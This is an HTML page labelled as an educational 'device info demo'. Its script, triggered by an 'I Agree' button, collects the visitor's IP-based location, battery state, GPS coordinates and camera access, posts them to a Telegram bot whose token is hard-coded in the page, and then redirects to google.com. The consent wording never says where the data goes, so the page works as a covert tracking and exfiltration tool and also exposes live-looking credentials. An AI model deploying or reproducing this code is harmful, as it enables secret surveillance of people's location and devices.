<!DOCTYPE html>
<html>
<head>
  <title>Device Info Demo</title>
  <meta charset="UTF-8">
</head>
<body>
  <h2>This website is for educational purposes only.</h2>
  <p>It demonstrates how websites can collect device info ethically and with user consent.</p>
  <button id="agreeBtn">I Agree</button>

  <script>
    const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const ipToken = "18d2a866939a58";

    async function getDeviceInfo() {
      let data = {
        ip: "Unknown",
        city: "",
        region: "",
        country: "",
        battery: "Unknown",
        charging: "Unknown",
        location: "Denied",
        camera: "Not Attempted"
      };

      // Get IP info from ipinfo.io using your token
      try {
        const ipRes = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
        const ipData = await ipRes.json();
        data.ip = ipData.ip;
        data.city = ipData.city;
        data.region = ipData.region;
        data.country = ipData.country;
      } catch (e) {
        console.error("IP info error:", e);
      }

      // Get battery info
      try {
        const battery = await navigator.getBattery();
        data.battery = (battery.level * 100).toFixed(0) + "%";
        data.charging = battery.charging ? "Yes" : "No";
      } catch (e) {
        console.error("Battery info error:", e);
      }

      // Get geolocation
      try {
        const position = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej);
        });
        data.location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
      } catch (e) {
        data.location = "Denied or Unavailable";
      }

      // Try camera access
      try {
        await navigator.mediaDevices.getUserMedia({ video: true });
        data.camera = "Access Granted";
      } catch (e) {
        data.camera = "Access Denied";
      }

      return data;
    }

    function sendToTelegram(data) {
      const message = `
🔐 *User Device Info*
🌐 IP: ${data.ip}
📍 Location: ${data.city}, ${data.region}, ${data.country}
🔋 Battery: ${data.battery} | Charging: ${data.charging}
📡 GPS: ${data.location}
📷 Camera: ${data.camera}
      `;
      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    document.getElementById("agreeBtn").addEventListener("click", async () => {
      const info = await getDeviceInfo();
      sendToTelegram(info);
      setTimeout(() => {
        window.location.href = "https://google.com"; // Redirect
      }, 3000);
    });
  </script>
</body>
</html>
